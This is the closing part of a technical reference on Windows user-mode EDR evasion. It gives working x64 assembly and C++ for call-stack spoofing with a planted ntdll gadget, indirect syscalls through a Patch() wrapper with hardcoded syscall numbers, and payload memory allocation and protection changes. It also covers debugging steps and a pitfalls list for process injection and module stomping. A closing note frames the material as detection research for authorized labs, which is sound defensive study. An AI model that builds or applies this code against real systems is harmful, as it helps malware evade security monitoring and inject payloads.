mov  [rsp+0x8],  rsi       ; save non-volatile registers the stub will abuse
mov  [rsp+0x10], rdi
mov  [rsp+0x18], r12
sub  rsp, 0x100            ; local frame
mov  r10, rcx              ; r10 = target NT stub (trampoline arg 1)
lea  r12, Fixup            ; r12 = address of the restore routine
sub  rsp, 0x200            ; construct a synthetic frame
mov  [rsp], r8             ; ★ plant the "call r12" ntdll gadget as the fake
                           ;   return address at the top of the frame
<shift NT arguments into rcx/rdx/r8/r9; copy stack arguments down>
Do_Call:
jmp  r10                   ; ★ JMP, not CALL — nothing further is pushed; from
                           ;   the callee's perspective it "was called from ntdll"
───────────────────────────────────────────────────────────────
   │  NT stub executes → syscall → returns to top of stack
   ▼
ntdll! <call r12 gadget>   ; pops the planted address; the gadget then pushes the
   │                       ; instruction following it (a genuine ntdll address —
   │                       ; the disguise) and transfers to r12
   ▼
Fixup:
mov  rsi, [rsp + 0x200 + 0x8]   ; restore non-volatile registers
mov  rdi, [rsp + 0x200 + 0x10]
mov  r12, [rsp + 0x200 + 0x18]
add  rsp, 0x300                 ; tear down the synthetic frame
ret                             ; return to the real C++ caller
```

The two load-bearing ideas: **(a)** `mov [rsp], r8` plants the fake return address — the callee's eventual `ret` pops whatever was planted, so the stack reads "called from ntdll"; **(b)** the `call r12` gadget *re*-plants a genuine ntdll return address before chaining to the fixup, so the visible stack shows a legitimate ntdll frame. Frame offsets (`0x100`/`0x200`/`0x300`) are internal to a given trampoline implementation — assembly fragments from different implementations are **not interchangeable**.

## 11. The `Patch()` Wrapper Pattern

Spoofed indirect-syscall implementations converge on a single wrapper invoked consistently:

```cpp
void Patch(
    PVOID TargetStub,    // arg1 → rcx : address of the asm stub to enter
    DWORD nArgs,         // arg2 → rdx : argument count, including the gadget slot
    PVOID Gadget,        // arg3 → r8  : "call r12" gadget — becomes the fake return
    PVOID ntArg1,        // arg4 → r9  : NT argument 1
    PVOID ntArg2,        // arg5 → stack : NT argument 2
    /* ... */            //             : NT arguments 3..N
    PVOID SyscallGadget  // last slot  : "syscall; ret" gadget, read by the stub
);                       //              from [rsp+0x38] (7th) or [rsp+0x30] (6th)
```

Allocation example (six NT arguments + gadget = 7 slots):

```cpp
Patch(
  (PVOID)NtAllocateVirtualMemory,
  7,
  ctx.Gadget,
  (PVOID)-1,                            // ProcessHandle (-1 = current process)
  (PVOID)&execMem,                      // *BaseAddress
  (PVOID)0,                             // ZeroBits
  (PVOID)&allocSize,                    // *RegionSize
  (PVOID)(MEM_COMMIT | MEM_RESERVE),
  (PVOID)PAGE_READWRITE,
  ctx.SyscallGadget                     // lands at [rsp+0x38]
);
```

Matching stub:

```asm
NtAllocateVirtualMemory:
    mov  r10, rcx             ; arg1 → r10 (syscall convention)
    mov  eax, 18h             ; SSN — build-specific, verify per target
    mov  r11, [rsp + 0x38]    ; 7th argument = syscall gadget
    jmp  r11                  ; jump to "syscall; ret" inside ntdll
```

Protection-change variant (`NtProtectVirtualMemory`: five NT arguments + gadget = 6 slots): `mov eax, 50h`, gadget read from `[rsp + 0x30]`.

Context structure:

```cpp
struct SpoofingContext {
    PVOID Gadget;         // "call r12" address inside ntdll
    PVOID SyscallGadget;  // "syscall; ret" address inside ntdll
    bool  Ready;          // true once gadgets and SSNs are resolved
};
```

Because `NtProtectVirtualMemory` mutates its `*BaseAddress`/`*RegionSize` inputs (page alignment), a restore call must re-set them first:

```cpp
baseAddress = (PVOID)entryPoint;   // re-set AFTER the first protect call —
regionSize  = payloadSize;         // it may have page-rounded the values
Patch((PVOID)NtProtectVirtualMemory, 6, ctx.Gadget, (PVOID)-1,
      (PVOID)&baseAddress, (PVOID)&regionSize,
      (PVOID)(UINT_PTR)dwOldProtection,      // restore original protection
      (PVOID)&dwOldProtection,               // dummy out-param
      ctx.SyscallGadget);
```

## 12. Debugging

**WinDbg reference:**

| Command | Meaning |
|---|---|
| `bu KERNELBASE!VirtualProtect` | deferred breakpoint (resolves on module load) |
| `bp ntdll!NtProtectVirtualMemory+0x12` | breakpoint at a byte offset into a function |
| `bp ntdll!<gadgetFn>+0x12` | breakpoint **at the borrowed gadget** — the correct way to observe indirect syscalls |
| `g` | run |
| `kn` | stack trace with frame numbers — the before/after-spoofing comparison view |
| `r` | register dump (observe r10/eax/r11 within stubs) |
| `p` / `t` | step over / step into |
| `u ntdll!NtAllocateVirtualMemory` | disassemble — **read the SSN for the current build** |

**Verification workflow:**

1. Insert `__debugbreak();` (compiles to `int 3`) in the C++ code, or prefix the payload with `0xCC` (`printf '\xcc' | dd of=payload.bin bs=1 count=1 conv=notrunc`).
2. Attach WinDbg; break on the gadget, not the hooked API — an indirect syscall **never executes the NT function's entry point**, so a breakpoint there will not fire.
3. Capture `kn` output at the syscall before and after enabling spoofing. Expected before: `ntdll → KernelBase → <loader>` (or `Unbacked`); expected after: `ntdll → ntdll` (e.g., a frame inside an innocuous ntdll function).
4. Confirm execution correctness (payload side effects) and register integrity after the fixup.

For process/memory inspection on a lab system, Process Hacker or System Informer display per-region protections (`Private Commit`, RW/RX/RWX), file backing, and per-thread start addresses and stacks — the direct observable counterparts of every technique above.

## 13. Pitfalls Checklist

1. **Architecture mismatch.** x64 shellcode in an x86 process produces an immediate `0xC0000005`. Build x64 and verify (`dumpbin /headers binary.exe | findstr machine`).
2. **SSNs are build-specific.** Never hardcode; read them from the target build's ntdll stubs or resolve dynamically (published techniques: Hell's Gate reads `mov eax, imm32` from stubs; Tartarus'/Halo's Gate recover SSNs for hooked stubs by walking adjacent stubs).
3. **Gadget addresses drift.** Scan at runtime, every run. Hardcoded offsets are debugging notes, not code.
4. **`mov r10, rcx` is mandatory.** `syscall` clobbers `rcx` and `r11`; the kernel reads argument 1 from `r10`.
5. **NT memory functions mutate their inputs.** `NtAllocateVirtualMemory`/`NtProtectVirtualMemory` take pointer-to-pointer/pointer-to-size and page-round them. Re-initialize before subsequent calls on the same region.
6. **Out-parameters require valid storage.** `&threadId`, `&oldProtect`, `&written`, `lpflOldProtect` — pass the address of a declared variable or `NULL` where permitted; never an uninitialized pointer.
7. **Remote ≠ local.** `VirtualAllocEx`, `WriteProcessMemory`, `VirtualProtectEx`, `CreateRemoteThread` take a process handle; `memcpy` and `CreateThread` do not cross the process boundary. Mixing the two families is the most common injection defect.
8. **Frozen processes must be resumed** — with the call matching the creation flag (`ResumeThread` vs. `DebugActiveProcessStop`).
9. **`CONTEXT` requires `ContextFlags = CONTEXT_FULL`** and a suspended target.
10. **Structure size fields are validated**: `STARTUPINFOA.cb`, `THREADENTRY32.dwSize`; NT mapping requires `*BaseAddress = NULL` and `*ViewSize = 0` beforehand.
11. **Restore non-volatile registers** (`rsi`/`rdi`/`r12`) in any fixup path, or subsequent C++ execution corrupts.
12. **Do not interleave assembly fragments** from different spoofing implementations — frame offsets are internally consistent but mutually incompatible.
13. **Close every handle opened** — process, thread, snapshot, section.
14. **Breakpoints must target the gadget**, not hooked API entry points, once execution is indirect.
15. **Match sacrificial function/section size to payload size** in module stomping; verify `.text` capacity before overwriting.

---

## Closing Note on Scope

This reference explains *how the mechanisms work* at the API and instruction level. Two boundaries are worth stating plainly. First, everything here targets **user-mode** telemetry and hooking; kernel-side collection (ETW-TI, kernel callbacks) observes the underlying operations regardless of user-mode stack contents, and mature defensive platforms consume both. Second, the legitimate use of this knowledge — building detection rules, writing yara/behavioral content, validating coverage in a lab, or understanding incident artifacts — depends on exactly the same fundamentals documented above. A researcher who can implement a technique is a researcher who can write the rule that detects it; that symmetry is the reason this material is worth learning carefully and using only where authorized.